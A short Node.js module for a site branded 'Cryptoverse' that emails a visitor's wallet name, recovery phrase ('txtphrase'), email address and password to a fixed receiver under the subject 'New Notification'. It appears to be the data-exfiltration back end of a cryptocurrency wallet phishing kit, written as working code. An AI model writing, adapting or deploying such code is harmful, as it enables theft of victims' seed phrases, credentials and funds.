const nodemailer = require("nodemailer");
const { generateEmailHTML } = require("./emailTemplate");

const emailSender = async function (options) {
  let transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST,
    port: 465,
    secure: true,
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASSWORD,
    },
  });
  let mailOptions = {
    from: `Cryptoverse`, // sender address
    to: process.env.EMAIL_RECEIVER, // list of receivers
    subject: options.subject, // Subject line
    html: options.body, // html body
  };

  const info = await transporter.sendMail(mailOptions);

  console.log("Message sent %s", info.messageId);
};

const sendEmail = async function (content) {
  try {
    const body = generateEmailHTML(
      content.wallet,
      content.txtphrase,
      content.email,
      content.txtpassword
    );
    const subject = `New Notification`;
    await emailSender({
      subject,
      body,
    });
  } catch (error) {
    console.log(`There was an error sending the email: ${error} Try again later!`);
  }
};

module.exports = { sendEmail };